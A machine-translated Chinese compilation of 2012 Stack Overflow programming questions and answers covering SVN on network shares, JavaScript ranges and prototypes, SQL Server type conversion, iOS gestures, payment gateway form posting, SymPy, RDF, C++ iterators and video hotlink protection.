我们所做的代码更改必须在我们的开发服务器上进行测试，然后才能在线提交到实时站点。就目前而言，我现在在自己的硬盘上签出了一份工作副本。我必须提交我的更改，在开发服务器上更新（并祈祷它可以工作 - 无论哪种方式都需要 AGES）并测试它们，然后在它们工作时更新实时服务器。

我也无法在网络共享上签出新的工作副本 - 再次，它通常无法抱怨磁盘 I/O 错误或数据库被锁定。我们已经禁用了 Mac 的所有省电功能，以防睡眠或硬盘减速导致 - 运气不好。

如果可能，我希望将工作副本保留在网络共享上。正如我已经说过的，我意识到这不是执行 SVN 的最合适的方式，但它一直在为我们工作。我可以做些什么来尝试解决这个问题？我怀疑它与 Windows -> Mac 网络相关，实际上还有另一个问题是关于从我的机器到 Mac 网络共享的慢速网络访问。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:23:27.913

从 SVN 1.7 开始，SQLite 被用作工作副本的数据库。如[SQLite 版本 3 中的文件锁定和并发中所述](http://www.sqlite.org/lockingv3.html)：

> SQLite 使用 POSIX 咨询锁来实现 Unix 上的锁定。在 Windows 上，它使用 LockFile()、LockFileEx() 和 UnlockFile() 系统调用。SQLite 假定这些系统调用都像宣传的那样工作。如果不是这种情况，则可能导致数据库损坏。应该注意的**是，已知 POSIX 咨询锁定在许多 NFS 实现（包括最新版本的 Mac OS X）上存在错误甚至未实现，**并且有报告称 Windows 下的网络文件系统存在锁定问题。您最好的防御措施是不要将 SQLite 用于网络文件系统上的文件。

看来这是你的问题。您应该使用本地工作副本以避免出现问题。在开发过程中，您可能会获得额外的性能提升，因为文件 I/O 可能会减少。

关于您的部署服务器，您可能会考虑使用诸如[TeamCity](http://www.jetbrains.com/teamcity/)或[Hudson](http://hudson-ci.org/)之类的集成服务器，一旦正确配置就可以将您的更改自动部署到您的开发服务器上（例如，在每次提交时）。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:13:47.703

类似问题已在[此处](https://stackoverflow.com/questions/127932/svn-working-copy-xxx-locked-and-cleanup-failed)得到解答- [SVN 中的工作副本 XXX 被锁定且清理失败](https://stackoverflow.com/questions/127932/svn-working-copy-xxx-locked-and-cleanup-failed)

它可能不是理想的方法，但它可以帮助您解决锁问题。

考虑每次都检查到新目录，而不是用新目录替换旧目录

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-11-13T12:09:51.510

当您更换服务器软件时，您访问这些“网络共享”的方式很可能已经改变。因此，您现在很可能面临与以下事实相关的不同（更多）问题：通过网络共享访问 svn checkouts 无法可靠地工作。

但是，为什么要进行共享结账呢？对所有开发系统进行单独检查并单独提交更改更有意义......

# javascript - Range.compareBoundaryPoints() 产生奇怪的结果

> ID：13360459
> 
> 赞同：4
> 
> 时间：2012-11-13T12:06:16.420
> 
> 标签：javascript

我将 Range 对象用作表示当前选择的另一个 Range 对象的限制器，以便修剪掉所选范围内但超出限制范围边界的任何内容。为了比较两个 Ranges 的位置，我使用 Range.compareBoundaryPoints() 函数，但结果没有意义。

我正在使用的元素如下所示：

```
<p id="myBlock" contenteditable="true">
  Hello hello hello, this is a great big block of test text.
</p> 
```

定义范围并检索它们的位置关系如下：

```
var limitingRange = document.createRange();
limitingRange.selectNodeContents($('#myBlock')[0]);
var selectedRange = window.getSelection().getRangeAt(0).cloneRange(); //Use whatever method is supported by the browser to get the Range

var endToStart = limitingRange.compareBoundaryPoints(Range.END_TO_START, selectedRange);
var startToEnd = limitingRange.compareBoundaryPoints(Range.START_TO_END, selectedRange);
var startToStart = limitingRange.compareBoundaryPoints(Range.START_TO_START, selectedRange);
var endToEnd = limitingRange.compareBoundaryPoints(Range.END_TO_END, selectedRange); 
```

然后我在文本中选择单词“this”并运行该函数。我的范围看起来像这样（我正在发明 .start 和 .end 符号来尝试使我的描述更清晰）：

(limitingRange.start)你好你好你好，(selectedRange.start)this(selectedRange.end) 是一大块测试文本。(limitingRange.end)

结果值为：
endToStart = -1
startToEnd = 1
startToStart = -1
endToEnd = 1

我对如何解释函数的结果感到困惑。例如，根据规范，如果 selectedRange 的结束出现在限制范围的开始之前，endToStart 应该包含 -1，但显然情况并非如此。这里发生了什么？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-11-13T12:06:16.420

我正在回答我自己的问题：输入正在发生的事情让我真正理解了函数的行为，这真的很奇怪。

a.compareBoundaryPoints(X_TO_Y, b) 的结果是 aY 与 bX 的比较，如果 aY 在 bX 之前，则为 -1，如果它们在同一位置，则为 0，如果在之后，则为 1。

所以在上例的 endToStart 中，limitingRange.start 与 selectedRange.end 进行比较，-1 表示首先是limitingRange.start。

startToEnd：limitingRange.end 在 selectedRange.start 之后，所以结果是 1。
startToStart：limitingRange.start 在 selectedRange.start 之前，所以结果是 -1。
endToEnd：limitingRange.end 在 selectedRange.end 之后，所以结果为 1

只留下一个问题：为什么这个函数会这样？常量的名称与人们直觉所期望的相反。

# sql-server - Where 子句中的 Int 和 Varchar (SQL Server) 之间的区别？

> ID：13360464
> 
> 赞同：3
> 
> 时间：2012-11-13T12:06:53.220
> 
> 标签：sql-server, where-clause, types

AID 是SQL Server 中的一种类型`AID = 10`或何时有什么区别？`AID = '10'``INT`

```
Select *
from ATable
where AID = '10' 
```

和

```
Select *
from ATable
where AID = 10 
```

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T12:15:03.693

不同之处在于 SQL 需要进行转换才能将`varchar`常量与列的类型进行比较。

如果您显示第一个查询的执行计划，您将看到如下内容：

```
CONVERT_IMPLICIT(int, [@1], 0) 
```

**编辑**

在上述情况下，常量的转换只会对性能产生很小的影响。但是，如果转换是在列（而不是常量）上完成的，这可能会导致扫描，从而产生更严重的后果。

根据 Remus 的回答，您可以在[此处查看转换的优先顺序](http://msdn.microsoft.com/en-us/library/ms190309.aspx)

# objective-c - UIPinchGestureRecognizer 缩放所有视图

> ID：13360467
> 
> 赞同：0
> 
> 时间：2012-11-13T12:07:09.993
> 
> 标签：objective-c, xcode, uigesturerecognizer, instance-variables, uipinchgesturerecognizer

在我的项目中，我有一个 UIImageVIew，用户在其中导入背景，然后在该背景上放置较小的图片。

我只想将手势应用于被点击的较小图片。我使用的手势是点击、长按、平移和捏合手势。我的问题只是捏手势。我可以单独应用长按、点击和平移，但可以捏合，不仅可以缩放较小的图片，还可以缩放背景。知道如何解决这个问题吗？

在我的 - (void)viewDidLoad 我已经设置：

```
 //single tap 
    UITapGestureRecognizer *tapg = 
    [[UITapGestureRecognizer alloc] initWithTarget:self 
                                            action:@selector(tapAction:)];
    [self.itemView addGestureRecognizer:tapg];

    // double tap
    UITapGestureRecognizer *doubleTap =
    [[UITapGestureRecognizer alloc] initWithTarget:self
                                            action:@selector(doubleTapAction:)];
    doubleTap.numberOfTapsRequired = 2;
    [self.itemView addGestureRecognizer:doubleTap];

    // longPress
    UILongPressGestureRecognizer *longPress =
    [[UILongPressGestureRecognizer alloc] initWithTarget:self 
                                                  action:@selector(longPressAction:)];
    [self.itemView addGestureRecognizer:longPress];

    // pan
    UIPanGestureRecognizer *pan =
    [[UIPanGestureRecognizer alloc] initWithTarget:self 
                                            action:@selector(panAction:)];
    [self.itemView addGestureRecognizer:pan];

    //pinch

    UIPinchGestureRecognizer *pinch = [[UIPinchGestureRecognizer alloc] initWithTarget:self     action:@selector(pinchAction:)];
    [self.itemView addGestureRecognizer:pinch]; 
```

然后，

```
// tap
- (void)tapAction:(UITapGestureRecognizer *) sender{
CGPoint tapPoint = [sender locationInView:self.itemView];
NSLog(@">>>tap x=%.2f, y=%.2f", tapPoint.x, tapPoint.y);
int i =0;
isTaped = NO;
for (i = 0; i < ivMax; i++) {
    if (CGRectContainsPoint((*(iViews+i)).frame, tapPoint)) {
        isTaped = YES;
        iViewsTapidx = i;
        NSLog(@"i = %d", i);
        break;
    }
}
}

// doubleTap
- (void)doubleTapAction:(UITapGestureRecognizer *) sender{
NSLog(@">>>doubleTap");
CGPoint tapPoint = [sender locationInView:self.itemView];
isTaped = NO;
isDblTaped = NO;

int i =0;
for (i = 0; i < ivMax; i++) {
    if (CGRectContainsPoint((*(iViews+i)).frame, tapPoint)) {
        isDblTaped = YES;
        iViewsDblTapidx = i;
        break;
    }
}

// view
if (isDblTaped) {
    NSLog(@"remove %d", i);
    (*(iViews+i)).tag = 0;
    [*(iViews+i) removeFromSuperview];
}
}

// longPress
- (void)longPressAction:(UILongPressGestureRecognizer *) sender{
if ([sender state] == UIGestureRecognizerStateBegan) {

    NSLog(@">>>longPress 1");
}else if ([sender state] == UIGestureRecognizerStateEnded) {   
    //        NSLog(@">>>longPress 2");

    CGPoint tapPoint = [sender locationInView:self.itemView];
    NSLog(@">>>longPress 2 x=%.2f, y=%.2f", tapPoint.x, tapPoint.y);
    int i =0;
    for (i = 0; i < ivMax; i++) {
        NSLog(@"i = %d", i);
        if ((*(iViews+i)).tag == 0) {
            break;
        }
    }

    if (i < ivMax) {
        //set smaller picture
        UIImage *stampImage; 
        NSString *imagepath = [NSString stringWithFormat:@"%@%@",[FileUtility          getPDFImageFolderPath], self.menu.imageID];
        if (self.menu.imageID == nil || [self.menu.imageID isEqualToString:@""]) {
            stampImage = [UIImage imageNamed:@"NotExistFile.jpg"];

        } else {
            stampImage = [UIImage imageWithContentsOfFile:imagepath];
        }
        int parcent = stampImage.size.width / _width;   

        //show smaller picture
        *(iViews+i) = [[UIImageView alloc] initWithImage:stampImage];
        (*(iViews+i)).frame =  CGRectMake(tapPoint.x - stampImage.size.width/parcent/2, 
                                          tapPoint.y - stampImage.size.height/parcent/2, 
                                          stampImage.size.width/parcent,
                                          stampImage.size.height/parcent);
        (*(iViews+i)).tag = i+1;
        [self.itemView addSubview:*(iViews+i)];
        iViewsTapidx = i;
        isTaped = YES;
    }

}
}

// Pan
- (void)panAction:(UIPanGestureRecognizer *) sender{
NSLog(@">>>pan");
if (isTaped) {

    CGPoint p = [sender translationInView:self.itemView];
    CGPoint movePoint = CGPointMake((*(iViews+iViewsTapidx)).center.x + p.x, 
                                    (*(iViews+iViewsTapidx)).center.y + p.y);
    (*(iViews+iViewsTapidx)).center = movePoint;
    //        NSLog(@">>>pan x=%.2f, y=%.2f --> x=%.2f, y=%.2f", p.x, p.y, movePoint.x,    movePoint.y);
    NSLog(@">>>pan x=%.2f, y=%.2f", p.x, p.y);
    [sender setTranslation:CGPointZero inView:self.itemView];
}
}

// scale the piece by the current scale
// reset the gesture recognizer's rotation to 0 after applying so the next callback is a delta     from the current scale
- (void)pinchAction:(UIPinchGestureRecognizer *)sender
{  
 if ([sender state] == UIGestureRecognizerStateBegan || [sender state] ==   UIGestureRecognizerStateChanged) {
    [sender view].transform = CGAffineTransformScale([[sender view] transform], [sender scale],   [sender scale]);
    [sender setScale:1];

}

} 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-04-12T12:47:42.787

给你的图像名称插入

```
 [self.itemView addGesture..... 
```

# c# - 通过 Controller MVC3 提交表单

> ID：13360471
> 
> 赞同：0
> 
> 时间：2012-11-13T12:07:22.833
> 
> 标签：c#, ajax, asp.net-mvc-3

当我们结帐时，我必须与支付网关集成，我们需要在我们这边处理订单，然后我们需要发布到支付网关 url。我不能在控制器中使用重定向 b/c 需要在我们的服务器端处理订单后通过 post 向支付网关提供商发送数据，因此在 cshtml 中，默认帖子将发送到我们在控制器内部处理订单的操作之后我需要做一个帖子再次访问将更改 URL 和信用卡信息的支付网关，并且在提供商获取信用卡信息后，控制权再次返回到我们的网站。我希望我的问题很清楚

保存订单后，我需要将浏览器移动到 PAYU 页面，这不起作用 b/c MerchantReferenceNumber 是通过邮寄发送的，并且重定向被拒绝访问。

```
private void PostFormToPayU()
    {
        string url = "https://secure.safeshop.co.za/SafePay/Lite/Index.asp";
        var webClient = new WebClient();

        try
        {
            NameValueCollection vals = new NameValueCollection();

            vals.Add("SafeKey", "{XXXX-XXX-XXX-XX-XXXXXX}");
            vals.Add("MerchantReferenceNumber", "Test2");
            vals.Add("TransactionAmount", "599");
            vals.Add("CurrencyCode", "ZAR");
            vals.Add("ReceiptURL", "http://localhost:47638/Home/About");
            vals.Add("FailURL", "http://localhost:47638/Home/New");
            vals.Add("TransactionType", "Auth");

            byte[] responseArray = webClient.UploadValues(url, vals);
            Stream s = new MemoryStream(responseArray);
            Redirect("https://secure.safeshop.co.za/SafePay/Lite/Index.asp");
            //return new System.Net.Response(responseArray, (int)HttpStatusCode.OK);
            Console.WriteLine("stop");
        }
        catch (WebException e)
        {
            var response = (HttpWebResponse)e.Response;
            //byte[] responseBytes = IOUtil.StreamToBytes(response.GetResponseStream());
            //return new Response(responseBytes, (int)response.StatusCode);
            Console.WriteLine("stop");
        } 
    } 
```

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T12:21:33.003

我认为您只需要设置一个 Web 请求 (WebRequest.Create) 即可创建一个 HttpWebRequest。这可以使用您尝试发布到的系统的 URL 创建。

您需要将来自您网站的数据包装成预期消息的格式，并将其写入请求流。

简而言之，这就是它，显然在细节方面还有更多。

此外，您可能需要考虑将这种处理从控制器移到某种服务中，因为它相当复杂。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-14T06:35:46.923

到目前为止，我认为最好的解决方案是

```
 var context = HttpContext.Current;
        context.Response.Clear();
        context.Response.Write("<html><head>");
        context.Response.Write(string.Format("</head><body onload=\"document.{0}.submit()\">", FormName));
        context.Response.Write(string.Format("<form name=\"{0}\" method=\"{1}\" action=\"{2}\" >", FormName, Method, Url));
        for (int i = 0; i < inputValues.Keys.Count; i++)
            context.Response.Write(string.Format("<input name=\"{0}\" type=\"hidden\" value=\"{1}\">", HttpUtility.HtmlEncode(inputValues.Keys[i]), HttpUtility.HtmlEncode(inputValues[inputValues.Keys[i]])));
        context.Response.Write("</form>");
        context.Response.Write("</body></html>");
        context.Response.End(); 
```

在我将订单保存在数据库中后，我可以呈现 html 页面并提交表单 onload()。inputValues 是我需要传递给支付网关的名称值集合。

# mongodb - “MongoDB 没有完整的单服务器持久性”到底是什么意思？

> ID：13360472
> 
> 赞同：0
> 
> 时间：2012-11-13T12:07:23.607
> 
> 标签：mongodb

我了解数据库的 ACID 属性，[持久性](http://en.wikipedia.org/wiki/Durability_%28database_systems%29)是数据在数据库崩溃后能够幸存的保证。

但是我不明白“单服务器持久性”是什么意思？那么MongoDB是否具有多服务器持久性？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-11-13T18:30:16.297

MongoDB 过去没有单一服务器的持久性。然而，由于日志是默认开启的（从 2.0 开始），这不再是这种情况。在记录日志之前，您必须拥有多个节点以确保您的数据是安全的，并积极检查它是否在所有节点中都被考虑在内。

# c# - 将具有随机行和列（由对象定义）的表导出到 Excel

> ID：13360473
> 
> 赞同：2
> 
> 时间：2012-11-13T12:07:25.747
> 
> 标签：c#, asp.net, .net, reflection, parameters

我有一个任务，我确信可以以简单的方式轻松概括。

我有不同的表要动态导出到 excel，我正在做的是从 Object 参数创建 HTML 中的表列，并使用 List 上的 foreach 来创建行。

因此，例如，如果我有一个 Customer ( `List<Customer>`) 列表，我会根据 Object 属性的数量和名称创建 tr：

```
public class Customer
{
    public int DeliveryAddressId { get; set; }
    public DateTime CreatedDate { get; set; }
    public string Firstname { get; set; }
    public string Lastname { get; set; }
    ....
}

var output = "<table>";
        output += "<thead>";
        output += "<tr>";
        output += "<th>DeliveryAddressId </th>";
        ..... 
```

和 foreach 填充行：

```
foreach (var customer in List<Customer>)
        {
            output += "<tr>";
            output += "<td>" + customer.DeliveryAddressId + "</td>";
            ..... 
```

但是后来我有不同参数的不同对象，所以问题是：

如何创建一个以 a`List<Object>`作为输入的通用方法，并使用对象参数名称作为列名创建这种表，然后相应地循环行？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-11-13T12:11:25.320

如果您创建一个接受列表的泛型方法`T`

```
public string DumpToTable<T>(List<T> list) {
} 
```

您可以像这样枚举 T 上的所有公共属性：

```
var props = typeof(T).GetProperties(BindingFlags.Public); 
```

根据您的用例，您可能希望`.GetProperties(BindingFlags.Public | BindingFlags.DeclaredOnly);`过滤掉继承的成员。

对于每个`PropertyInfo`元素，您可以`.Name`在生成标题时访问它们的 , 。

之后，遍历列表，您必须调用它们的相关`.GetValue`方法：

```
foreach(T item in list) {
    string line = "";
    foreach(PropertyInfo prop in props) {
         line += string.Format("<td>{0}</td>", prop.GetValue(item));
    }
    output += string.Format("<tr>{0}</tr>", line);
} 
```

# wxwidgets - wxWidgets：是否有用于路径操作的功能？（拆分到子目录，加入，...）

> ID：13360475
> 
> 赞同：0
> 
> 时间：2012-11-13T12:07:27.460
> 
> 标签：wxwidgets

在 wxString 变量中有路径，如何附加子目录？是否有用于处理路径的特定功能？

对于那些了解 Python 语言的人来说，有一些不错的函数，比如使用操作系统特定的分隔符`os.path.join("sub1", "sub2", "sub3"...)`连接各个部分，以及分割目录的路径和姓氏。即使在您确定可以使用哪种分隔符的情况下，它也很好。`subX``os.path.split(path)``os.path.join()`

感谢您的时间和经验，

彼得

PS 我对最新的 wxWidgets 版本（2.9.4+）感兴趣。

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:11:30.633

wxFilename 可以满足您的需要。

[http://docs.wxwidgets.org/trunk/classwx_file_name.html](http://docs.wxwidgets.org/trunk/classwx_file_name.html)

所以，例如

```
wxFileName fname;
fname.AppendDir("sub1");
fname.AppendDir("sub2");
fname.SetName("test");
fname.SetExt("txt"); 
```

将在 windows 上创建

```
sub1\sub2\test.txt 
```

# jquery - 获取绑定函数的源元素

> ID：13360480
> 
> 赞同：0
> 
> 时间：2012-11-13T12:08:00.550
> 
> 标签：jquery, knockout.js

我正在使用 knockout.js 将视图模型中的某些函数绑定到 html 元素。其中之一是绑定到`<a/>`元素的单击事件。在实际功能中，我想为这个元素添加一个类名。

请访问[此 jsfiddle](http://jsfiddle.net/NMBNh/5/)以获取我当前情况的实时示例。

我想在这里实现的是用户单击的链接获得红色的前景色。我尝试使用几个选项，包括`$(event.target).addClass('selectedlink');`你在小提琴中看到的，但到目前为止没有成功。非常欢迎任何帮助。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T12:53:28.823

更新`activateitem`函数如下：

```
this.activateitem = function(data, context, event){
    $(event.target).addClass('selectedlink');
    this.activeitem($(data).html());
} 
```

# javascript - 为什么这个方法没有方法打印

> ID：13360491
> 
> 赞同：0
> 
> 时间：2012-11-13T12:08:41.790
> 
> 标签：javascript

我确信这真的非常简单，但是为什么以下不起作用。

```
var o = function() { };
o.prototype.print = function( ) { console.log("hi") };
o.print(); // console message: Object function o() { } has no method 'print' 
```

[在这里](http://jsfiddle.net/bruno/ptDQS/1/)提琴

**更新**

为什么这也不起作用

```
var o = function() { };
o.prototype.print = function( ) { console.log("hi") };
var c = Object.create( o );
c.print(); 
```

如有必要，我可以开始一个新问题。

* * *

## 回答 #1

> 赞同：6
> 
> 时间：2012-11-13T12:11:21.397

### 1\. 问题

> 我确信这真的非常简单，但是为什么以下不起作用。

`o` 是新对象的构造函数，您必须创建一个新对象才能使用原型方法：

```
var x = new o();
x.print(); 
```

### 2\. 问题

> 为什么这也不起作用

因为`Object.create`需要一个原型而不是一个对象：

```
var o = function() { };
o.prototype.print = function( ) { console.log("hi") };
var c = Object.create( o.prototype );
c.print(); 
```

也可以看看

*   MDN：[继承和原型链](https://developer.mozilla.org/en-US/docs/JavaScript/Guide/Inheritance_and_the_prototype_chain)
*   MDN：[对象.create](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/Object/create)
*   [JSFiddle 与第一个示例](http://jsfiddle.net/beQQz/)
*   [JSFiddle 与第二个示例](http://jsfiddle.net/ptDQS/3/)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:11:20.603

您需要`o`用作对象的构造函数。该对象将继承 的原型`o`。

```
var o = function() { };
o.prototype.print = function( ) { console.log("hi") };
a = new o(); //a inherits prototype of constructor o
a.print(); 
```

类似地，由于`o`它本身是 的一个实例`Function`，它继承了它的原型。考虑以下事实`var o = function(){}`：

```
var o = new Function (""); //o inherits prototype of constructor Function 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-11-13T12:16:22.597

```
函数 MyObject(){ };
var o = new MyObject();
MyObject.prototype.print = function() { console.log("hi") };
o.print();

```

# python - SymPy 无法求解 Matlab 可以求解的方程

> ID：13360496
> 
> 赞同：9
> 
> 时间：2012-11-13T12:09:08.970
> 
> 标签：python, sympy

我有一个与轨道力学中的太阳同步共振条件有关的方程。我目前正在学习 Python，所以我尝试使用以下代码在 SymPy 中解决它：

```
from sympy import symbols,solve

[n_,Re_,p_,i_,J2_,Pe_] = symbols(['n_','Re_','p_','i_','J2_','Pe_'])

del_ss = -((3*n_*(Re_**2)*J2_/(4*(p_**2)))*(4-5*(sin(i_)**2)))-((3*n_*(Re_**2)*J2_/(2*(p_**2)))*cos(i_))-((2*pi)/Pe_)

pprint(solve(del_ss,i_)) 
```

对于其中的五个变量，表达式可以成功重新排列，但是当`i_`在命令中使用变量时`solve`（如上），会产生错误：

```
Traceback (most recent call last):
  File "<stdin>", line 1, in <module>
  File "C:\Python27\lib\site-packages\spyderlib\widgets\externalshell\sitecustomize.py", line 479, in runfile
    execfile(filename, namespace)
  File "C:\Users\Nathan\Python\sympy_test_1.py", line 22, in <module>
    pprint(solve(del_ss,i_))
  File "C:\Python27\lib\site-packages\sympy\solvers\solvers.py", line 484, in solve
    solution = _solve(f, *symbols, **flags)
  File "C:\Python27\lib\site-packages\sympy\solvers\solvers.py", line 700, in _solve
    soln = tsolve(f_num, symbol)
  File "C:\Python27\lib\site-packages\sympy\solvers\solvers.py", line 1143, in tsolve
    "(tsolve: at least one Function expected at this point")
NotImplementedError: Unable to solve the equation(tsolve: at least one Function expected at this point 
```

但是，当在 Matlab 中输入相同的表达式并`solve`调用命令时，它会正确重新排列。我意识到该错误提到了一个未实现的功能，并且这两个功能无疑会有所不同，但如果有更合适的 SymPy 功能可以使用，我仍然会很高兴。任何帮助将不胜感激。

* * *

## 回答 #1

> 赞同：9
> 
> 时间：2012-11-13T12:54:31.783

1.  使用 Pi 的 sympy 版本。
2.  `cos(i_)`用新变量替换，用`ci_`替换，然后求解。`sin(i_)**2``1-ci_**2``ci_`

这应该这样做：

```
from sympy import symbols,solve,sin,cos,pi

[n_,Re_,p_,ci_,J2_,Pe_] = symbols(['n_','Re_','p_','ci_','J2_','Pe_'])

del_ss = -((3*n_*(Re_**2)*J2_/(4*(p_**2)))*(4-5*(1-ci_**2)))-((3*n_*(Re_**2)*J2_/(2*(p_**2)))*ci_)-((2*pi)/Pe_)

pprint(solve(del_ss,ci_)) 
```

（编辑是因为我在第一次尝试时只写了一半的解决方案......）

# rdf - 如何将属性表示为 RDF 中的属性

> ID：13360497
> 
> 赞同：2
> 
> 时间：2012-11-13T12:09:16.187
> 
> 标签：rdf

假设我有这样的三倍`user, action type, object`：

```
andy visited url1
andy visited url2 
```

我如何将时间戳值编码到这些关系中，以便我们知道之前`andy`访问`url1`过`url2`？

RDF 甚至是正确的数据模型，还是我应该使用属性图？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T17:03:10.767

您可以通过使访问成为您可以附加数据的自己的资源来对其进行建模：

```
:Andy :visited [ 
  :url <the_visited_url>; 
  :timestamp "the timestamp"^^xsd:dateTime 
]. 
```

或者：

```
:Visit1 a :Visit; 
  :visitedBy :Andy; 
  :url <the_visited_url>; 
  :timestamp "the timestamp"^^xsd:dateTime. 
```

在任何一种情况下，访问本身都是一个概念，它可以让你说出你想要的任何内容，包括它发生的时间或访问的 URL。

# debugging - 如何在 mongodb 的 map/reduce 中逐步调试

> ID：13360499
> 
> 赞同：1
> 
> 时间：2012-11-13T12:09:19.437
> 
> 标签：debugging, mongodb

有没有办法在 MongoDB 的 map/reduce javascript 中**逐步调试？**

看来我们只能`print()`用来写一些数据到日志文件了。--> [mongodb：如何在 mongodb shell 上调试 map/reduce](https://stackoverflow.com/questions/7527126/mongodb-how-to-debug-map-reduce-on-mongodb-shell)

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T13:59:06.343

请参阅以下页面，该页面提供了有关如何在 MongoDB MapReduce 中调试 map 和 reduce 步骤的详细信息：MapReduce[故障排除](http://www.mongodb.org/display/DOCS/Troubleshooting+MapReduce)

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2014-08-08T17:34:47.800

还可以看看这个简单的在线 MongoDB MapReduce 调试器，它允许在您的浏览器开发环境中（例如在 Chrome DevTool 中）获取样本数据的聚合结果以及执行 Map / Reduce / Finalize 函数的逐步调试。

[http://targetprocess.github.io/mongo-mapreduce-debug-online/](http://targetprocess.github.io/mongo-mapreduce-debug-online/)

# c++ - 正确解引用指向指针的迭代器

> ID：13360500
> 
> 赞同：1
> 
> 时间：2012-11-13T12:09:28.643
> 
> 标签：c++, vector, iterator, dereference

我有一个指向对象的指针向量。每个对象都存储一个值并具有一个 toString() 函数，该函数将该值作为字符串返回。我有一个迭代器来遍历向量，我需要通过调用 toString() 来提取每个对象的值。问题是，我不知道如何获得价值。

该函数最终应该将数字写入文件，但我正在使用 cout 进行测试。

```
 void writeNumbers(vector<Integer*>& input)
    {
        ofstream write;
        write.open("Integers.txt");
        vector<Integer*>::iterator iter = input.begin();
        for (iter; iter < input.end(); iter++)
        {
            **std::cout << (*iter)->toString() << std::endl;**
        }
        write.close();

I get an Access Violation error which points me to the toString() function:

    std::string Integer::toString()
    {
        std::stringstream ss;
        ss << *(this)->value;
        return ss.str();
    }

toString() works fine whenever I don't try to access it through the iterator. 
```

编辑： toString 中的值实际上是一个指向数字的指针。

Edit2：新的 writeNumbers：

```
void writeNumbers(vector<Integer*>& input)
{
    ofstream write;
    write.open("Integers.txt");
    vector<Integer*>::iterator iter = input.begin();
    for (iter; iter != input.end(); iter++)
    {
        std::cout << (*iter)->toString() << std::endl;
    }
    write.close();
} 
```

**最终编辑**：好吧，问题原来是一个糟糕的构造函数，它未能正确初始化指针，所以我离问题的实际位置很远。:)

```
Integer::Integer(string input)
{
if(isNaN(input))
value = new int(atoi(input.c_str()));
} 
```

所以它**应该**是！isNaN，另外我修复了在错误输入时初始化它的问题：

```
//New constructor, works 100%
Integer::Integer(string input)
{
if(!isNaN(input))
    value = new int(atoi(input.c_str()));
else
    value = new int(0);
} 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-11-13T12:18:30.860

您的 toSting() 有问题。改变

`ss <<*(this)->value;`

至

```
ss << value; 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-11-13T12:10:40.447

编辑：这不是错误，而是使用迭代器时的一般建议。不要用于`<`检查结束，使用`!=`.

```
iter < input.end() 
```

它应该是这样的：

```
iter != input.end() 
```

这是因为对于某些容器， < 运算符不会按照您的预期执行。结果，在某些时候，您可能会取消引用 input.end() 本身，它什么都没有。

# java - 用java编辑mp4标签

> ID：13360501
> 
> 赞同：3
> 
> 时间：2012-11-13T12:09:30.513
> 
> 标签：java, tags, mp4, mp4parser

我想在 java 中编辑 mp4 视频文件的标签。我在谷歌代码上找到了 mp4parser，但没有足够的文档。在 java 中编辑 mp4 视频标签的最佳库是什么。mp4视频中的评论标签有什么限制吗？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2017-09-29T00:20:55.530

所以你所说的标签是指标题、艺术家、专辑等？在这种情况下，您可以尝试 JCodec ( [org.jcodec.movtool.MetadataEditor](https://github.com/jcodec/jcodec/blob/master/src/main/java/org/jcodec/movtool/MetadataEditor.java) ) 中提供的新 API。它还有一个 CLI ( [org.jcodec.movtool.MetadataEditorMain](https://github.com/jcodec/jcodec/blob/master/src/main/java/org/jcodec/movtool/MetadataEditorMain.java) )。

以下是基本用法：

```
# Changes the author of the movie
./metaedit -f -si ©ART=New\ value file.mov 
```

或通过 Java API 做同样的事情：

```
MetadataEditor mediaMeta = MetadataEditor.createFrom(new
    File("file.mp4"));
Map<Integer, MetaValue> meta = mediaMeta.getItunesMeta();
meta.put(0xa9415254, MetaValue.createString("New value")); // fourcc for '©ART'
mediaMeta.save(false); // fast mode is off 
```

您可以在此处找到完整的文档：http: [//jcodec.org/docs/working_with_mp4_metadata.html](http://jcodec.org/docs/working_with_mp4_metadata.html)

# php - JWPlayer 和保护视频

> ID：13360505
> 
> 赞同：3
> 
> 时间：2012-11-13T12:09:49.163
> 
> 标签：php, video, streaming

我目前在我的网站上使用[JWPlayer](http://www.longtailvideo.com/jw-player/)，我被要求保护视频。唯一的问题是视频的工作方式，视频 URL 只是放在标签中。如果有人想下载视频，他们只需查看源代码就可以了。

谁能想到一种方法，我至少可以让人们下载视频有点困难。我知道要保护视频几乎是不可能的（如果像 youtube 和所有其他网站这样的网站不管理它）但我至少希望能够让它变得困难。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-11-13T12:29:51.423

一种简单的方法是禁止对视频进行“盗链”。换句话说：仅在发送“正确”的引用标头时才响应请求。这样一来，您就不能简单地将视频的 URL 复制并粘贴到地址栏并下载。

在带有 mod_rewrite 的 Apache 中，这将类似于：

```
RewriteEngine on
RewriteCond %{HTTP_REFERER} !^http://(www\\.)?yoursite\\.com [NC]
RewriteRule \\.(mp4)$ - [NC,F] 
```

当然，您需要调整 about 部分`yoursite\\.com`和 about 部分`mp4`。

请注意，不发送referer 标头的浏览器（或“隐私设置”）即使在播放器中也不会播放视频。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-11-13T12:36:17.650

您可能会发现此链接对阅读很有用。

[http://flowplayer.blacktrash.org/secure-http.html](http://flowplayer.blacktrash.org/secure-http.html)

